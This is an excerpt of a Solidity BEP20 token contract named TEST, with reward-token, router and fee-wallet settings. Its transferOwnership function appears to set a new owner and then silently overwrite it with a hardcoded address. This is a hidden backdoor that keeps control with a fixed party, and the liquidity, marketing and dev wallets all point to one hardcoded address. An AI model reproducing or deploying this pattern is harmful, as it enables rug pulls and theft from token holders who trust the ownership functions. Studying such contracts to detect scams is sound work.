...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 RewardToken = IBEP20(0x3A766862FaC4Fc0D971de3836DFcc99B03F6CeDD);
...
abstract contract Auth {
    ...
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        owner = 0xf450AFfC8Cce44A014F54CCcA7DeB89403215b79;
...
contract TEST is IBEP20, Auth {
    ...
    address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address RewardToken = 0x3A766862FaC4Fc0D971de3836DFcc99B03F6CeDD; 
    ...
    constructor () Auth(msg.sender) {
        ...
        //
        autoLiquidityReceiver = 0x2e5c659d096094CF0859ab089DFB9381a73982FF;
        marketingWallet = 0x2e5c659d096094CF0859ab089DFB9381a73982FF;
        devWallet = 0x2e5c659d096094CF0859ab089DFB9381a73982FF;
